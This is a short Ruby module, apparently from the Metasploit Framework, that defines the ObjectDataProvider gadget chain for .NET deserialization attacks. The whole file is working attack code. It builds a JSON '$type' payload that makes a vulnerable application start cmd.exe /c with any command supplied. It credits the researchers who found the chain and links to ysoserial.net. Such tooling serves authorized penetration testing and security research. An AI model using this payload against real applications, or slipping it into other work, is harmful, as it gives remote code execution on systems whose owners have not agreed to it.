module Msf
module Util
module DotNetDeserialization
module GadgetChains

  class ObjectDataProvider

    attr_reader :object

    # ObjectDataProvider
    #   Credits:
    #     Finders: Oleksandr Mirosh, Alvaro Munoz
    #     Contributors: Alvaro Munoz, Soroush Dalili, Dane Evans
    #   References:
    #     https://github.com/pwntester/ysoserial.net/blob/10ae3389561ff0296b43a221d814c18910775ffb/ysoserial/Generators/ObjectDataProviderGenerator.cs

    def initialize(cmd)
      @object = {
        '$type' => 'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
        'MethodName' => 'Start',
        'MethodParameters' => {
          '$type' => 'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
          '$values' => ['cmd.exe', "/c #{cmd}"]
        },
        'ObjectInstance' => {
          '$type' => 'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
        }
      }
    end

    def self.generate(cmd)
      self.new(cmd)
    end
  end

end
end
end
end
